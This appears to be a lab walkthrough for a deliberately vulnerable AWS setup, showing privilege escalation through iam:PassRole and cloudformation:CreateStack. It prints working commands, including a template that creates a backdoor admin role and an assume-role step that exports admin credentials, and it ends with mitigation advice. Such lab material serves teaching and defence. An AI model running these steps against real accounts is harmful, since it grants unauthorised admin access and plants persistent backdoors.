# Guided Walkthrough: One-Hop Privilege Escalation via iam:PassRole + cloudformation:CreateStack

This scenario demonstrates a privilege escalation vulnerability where a user has permission to pass IAM roles to AWS CloudFormation (`iam:PassRole`) and create CloudFormation stacks (`cloudformation:CreateStack`). The attacker creates a CloudFormation stack with a malicious template that defines a new IAM role with administrative permissions and a trust policy allowing the attacker to assume it. By passing a privileged role to CloudFormation as the service role, the attacker leverages CloudFormation's elevated permissions to create resources they couldn't create directly.

The attack works by exploiting the CloudFormation service's ability to create and manage AWS resources on behalf of users. When CloudFormation executes with an administrative service role, it can create any AWS resource defined in the template, including IAM roles with privileged policies and custom trust relationships. The attacker crafts a template that creates a backdoor admin role, and CloudFormation provisions it using the passed admin role's permissions.

This technique is particularly dangerous because CloudFormation is often granted broad permissions to provision infrastructure, and developers are frequently given CloudFormation access without understanding the privilege escalation implications. The combination of `iam:PassRole` and `cloudformation:CreateStack` creates a complete path to admin access through infrastructure-as-code abuse.

## The Challenge

You start as `pl-prod-cloudformation-001-to-admin-starting-user`, an IAM user with two specific permissions: `iam:PassRole` on the role `pl-prod-cloudformation-001-to-admin-cfn-role`, and `cloudformation:CreateStack` on all resources. You cannot directly create IAM roles, attach policies, or perform any other IAM write actions.

Your goal is to reach `pl-prod-cloudformation-001-to-admin-escalated-role` — a new role with `AdministratorAccess` that does not exist yet. You must create it by abusing CloudFormation's ability to provision AWS resources on your behalf using a privileged service role.

Credentials for the starting user are available in the Terraform outputs under the key `single_account_privesc_one_hop_to_admin_cloudformation_001_iam_passrole_cloudformation`.

## Reconnaissance

First, confirm your identity and verify you cannot perform admin actions directly:

```bash
aws sts get-caller-identity
# Should show pl-prod-cloudformation-001-to-admin-starting-user

aws iam list-users
# Should fail with AccessDenied
```

Next, look at what roles are available to pass. You have `iam:PassRole` on a specific role — let's confirm it exists and understand what permissions it has:

```bash
aws iam get-role --role-name pl-prod-cloudformation-001-to-admin-cfn-role
# Note the trust policy: cloudformation.amazonaws.com is the trusted service

aws iam list-attached-role-policies --role-name pl-prod-cloudformation-001-to-admin-cfn-role
# Should show AdministratorAccess attached
```

The service role trusts `cloudformation.amazonaws.com` and has `AdministratorAccess`. That means if you pass it to a CloudFormation stack, the stack can create any resource — including IAM roles — using admin permissions.

## Exploitation

### Step 1: Craft a Malicious CloudFormation Template

Write a template that defines an IAM role with `AdministratorAccess`. The trust policy should allow your starting user to assume the role:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

cat > /tmp/cfn-cloudformation-001-escalation-template.yaml <<EOF
AWSTemplateFormatVersion: '2010-09-09'
Description: 'Privilege Escalation - Creates an admin role that trusts the starting user'

Resources:
  EscalatedRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: pl-prod-cloudformation-001-to-admin-escalated-role
      Description: 'Escalated role created via CloudFormation PassRole attack'
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-cloudformation-001-to-admin-starting-user
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess

Outputs:
  EscalatedRoleArn:
    Value: !GetAtt EscalatedRole.Arn
EOF
```

### Step 2: Create the Stack with the Privileged Service Role

This is the key step. By specifying `--role-arn`, you pass the admin service role to CloudFormation. CloudFormation will use that role to provision every resource in the template — including the new IAM role your starting user cannot create directly:

```bash
aws cloudformation create-stack \
  --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack \
  --template-body file:///tmp/cfn-cloudformation-001-escalation-template.yaml \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-cloudformation-001-to-admin-cfn-role \
  --capabilities CAPABILITY_NAMED_IAM
```

Wait for the stack to finish:

```bash
aws cloudformation wait stack-create-complete \
  --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack
```

### Step 3: Assume the Escalated Role

Once the stack is `CREATE_COMPLETE`, the escalated role exists and trusts your starting user. Assume it:

```bash
ESCALATED_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-cloudformation-001-to-admin-escalated-role"

CREDENTIALS=$(aws sts assume-role \
  --role-arn $ESCALATED_ROLE_ARN \
  --role-session-name escalation-demo \
  --query 'Credentials' \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

## Verification

Confirm you now have administrator access:

```bash
aws sts get-caller-identity
# Should show pl-prod-cloudformation-001-to-admin-escalated-role

aws iam list-users
# Should succeed and list all IAM users in the account
```

## What Happened

You exploited a well-known privilege escalation pattern: using `iam:PassRole` to delegate admin permissions to an AWS service, then using that service to create resources you could not create directly. CloudFormation is a particularly powerful target for this technique because infrastructure-as-code workflows are common, and passing roles to CloudFormation is standard operational practice — making the combination easy to overlook during IAM reviews.

The attack mirrors real-world scenarios where developers are granted CloudFormation access to deploy infrastructure without their security team realizing that passing an admin service role to CloudFormation is functionally equivalent to having `iam:CreateRole` + `iam:AttachRolePolicy` themselves. Preventing this requires either restricting the service roles that can be passed, or separating the principals that have `iam:PassRole` from those that have `cloudformation:CreateStack`.
